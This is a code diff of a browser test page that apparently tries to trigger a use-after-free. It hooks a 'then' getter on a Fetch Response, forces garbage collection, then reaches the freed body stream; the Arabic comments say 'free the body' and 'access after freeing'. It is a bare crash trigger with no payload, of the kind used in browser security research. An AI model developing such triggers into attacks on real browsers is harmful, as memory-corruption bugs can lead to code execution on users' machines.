@@ -8,9 +8,12 @@
             formData.append('emptyBlob', blob);
 
             let response = new Response(formData);
+            let originalBody = response.body;
+
             Object.defineProperty(response, 'then', {
                 get: function() {
                     response = null;
+                    originalBody = null; // تحرير الجسم
                     if (typeof gc === "function") gc();
                     return undefined;
                 }
@@ -18,17 +21,16 @@
 
             response.arrayBuffer().then(() => {
                 try {
-                    let consumer = response.body.getReader();
-                    consumer.read().then(() => {
-                        console.log("Attempting access after GC");
-                    }).catch(e => {
-                        console.error(e.message);
-                        alert(e.message);
-                    });
+                    // محاولة الوصول بعد التحرير
+                    let test = originalBody; // التحقق من الجسم المحرر
+                    console.log("Accessing locked stream");
                 } catch (e) {
                     console.error(e.message);
                     alert(e.message);
                 }
+            }).catch(e => {
+                console.error(e.message);
+                alert(e.message);
             });
         }
     </script>
